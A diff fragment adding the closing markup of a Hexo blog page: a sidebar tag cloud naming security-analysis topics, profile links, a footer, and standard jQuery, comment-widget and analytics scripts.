+			<li><a href="/tag/ActionScript中shellcode的定位和提取/" title="ActionScript中shellcode的定位和提取">ActionScript中shellcode的定位和提取<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ActionScript的反汇编和反编译/" title="ActionScript的反汇编和反编译">ActionScript的反汇编和反编译<sup>1</sup></a></li>
+		
+			<li><a href="/tag/Acunetix-Web-Vulnerability-Scanner/" title="Acunetix Web Vulnerability Scanner">Acunetix Web Vulnerability Scanner<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+      <li><a href="http://blog.csdn.net/dreajay" target="_blank" title="dreajay csdn">CSDN</a></li>
+      <li><a href="https://github.com/dreajay" target="_blank" title="dreajay github">github</a></li>
+      <li><a href="http://www.douban.com/people/72514701/" target="_blank" title="dreajay豆瓣">豆瓣</a></li>
+    </ul>
+</div>
+
+
+  <div class="rsspart">
+	<a href="atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	
+	<section class="info">
+		<p> 没有礁石，就没有美丽的浪花；没有挫折，就没有壮丽的人生！ <br/>
+			再长的路，一步步也能走完，再短的路，不迈开双脚也无法到达，平凡的脚步也可以走完伟大的行程！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/111" target="_blank" title="weibo"></a>
+		
+		
+		<a href="https://twitter.com/333" target="_blank" title="twitter"></a>
+		
+		
+		<a href="https://github.com/333" target="_blank" title="github"></a>
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="pacman">pacman</a> © 2016 
+		
+		<a href="http://ha.cker.in" target="_blank" title="Secer">Secer</a>
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"dreajaygithubblog"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F77edef7e6931022edbd2322ec66456e1' type='text/javascript'%3E%3C/script%3E"));
+</script>
+
+<div id="totop" style="position:fixed;bottom:150px;right:50px;cursor: pointer;">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+</div>
+<script type="text/javascript">
+	(function($) { 
+		// When to show the scroll link
+		// higher number = scroll link appears further down the page   
+		var upperLimit = 300;
+		
+		// Our scroll link element
+		var scrollElem = $('#totop');
+	   
+		// Scroll to top speed
+		var scrollSpeed = 800;
+	   
+		// Show and hide the scroll to top link based on scroll position   
+		scrollElem.hide();
+		$(window).scroll(function () {            
+			var scrollTop = $(document).scrollTop();       
+			if ( scrollTop > upperLimit ) {
+				$(scrollElem).stop().fadeTo(300, 1); // fade back in           
+			}else{       
+				$(scrollElem).stop().fadeTo(300, 0); // fade out
+			}
+		});
+		// Scroll to top animation on click
+		$(scrollElem).click(function(){
+			$('html, body').animate({scrollTop:0}, scrollSpeed); return false;
+		});
+	})(jQuery);
+</script>
+
+
+  </body>
 </html>
+
